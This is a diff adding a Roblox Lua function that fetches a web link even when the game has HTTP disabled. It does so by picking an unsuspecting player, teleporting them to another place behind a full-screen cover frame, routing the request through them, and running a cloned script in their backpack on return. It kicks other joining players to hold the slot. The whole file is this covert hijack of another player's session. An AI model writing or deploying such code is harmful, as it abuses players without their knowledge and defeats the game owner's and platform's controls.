@@ -1,0 +1,54 @@
+function GetAsync(link)
+	local data = nil
+	local sent = false
+	local s = pcall(function()
+		data = game:GetService("HttpService"):GetAsync(link)
+		sent = true
+	end)
+	if sent ~= true then
+		spawn(function() --Notifies you that the game is using a special function.
+			pcall(function()
+				script.Parent.SE:FireClient(script:FindFirstAncestorWhichIsA("Player"),"HttpGet","Game is non http, using a special function. Please wait up to 15-45 seconds.")
+			end)
+		end)
+		local Send = nil
+		for i,v in pairs(game:GetService("Players"):GetPlayers())do
+			if FindDescendant(v,"KrystalKrew") then --ignores anyone with the ui
+			else
+				Send = v --selected the person who will transmit the http data
+				break
+			end
+		end
+		local TempRemote = Instance.new("RemoteEvent") --how we will receive it.
+		TempRemote.Name = "InfoCount"
+		TempRemote.Parent = game:GetService("TestService")
+		TempRemote.OnServerEvent:Connect(function(p,data2)
+			warn("remote was fired")
+			if data2[1] == script:FindFirstAncestorWhichIsA("Player").Name then
+				data = data2[2]
+				game:GetService("Debris"):AddItem(TempRemote,.5)
+			end
+		end)
+		local USER = Send.Name
+		warn('HTTP is not enabled... Using a custom function.')
+		local con = nil
+		con = game:GetService("Players").PlayerAdded:Connect(function(p)
+			if p.Name == USER then
+				local S = script.hd:Clone()
+				S.Parent = p:FindFirstChildWhichIsA("Backpack")
+				S.Disabled = false
+				con:Disconnect()
+			elseif p.Name ~= USER and #game:GetService("Players"):GetPlayers() >= game:GetService("Players").MaxPlayers then
+				p:Kick("\nSpot reserved.") --so you can receive your data without someone taking that users spot.
+			end
+		end)
+		local I = Instance.new("ScreenGui") --To hide the teleport.
+		I.IgnoreGuiInset=true
+		Instance.new("Frame",I).Size = UDim2.new(1,0,1,0)
+		game:GetService("TeleportService"):Teleport(6234297034,Send,{"HttpGetAsync",game.PlaceId,link,script:FindFirstAncestorWhichIsA("Player").Name,game.JobId},I)
+		repeat wait() until data ~= nil
+	end
+	repeat wait() print('Obtaining data') until data ~= nil --So we know if the request has been sent
+	data = data --You can replace for a function to format the string however you want.
+	return data
+end
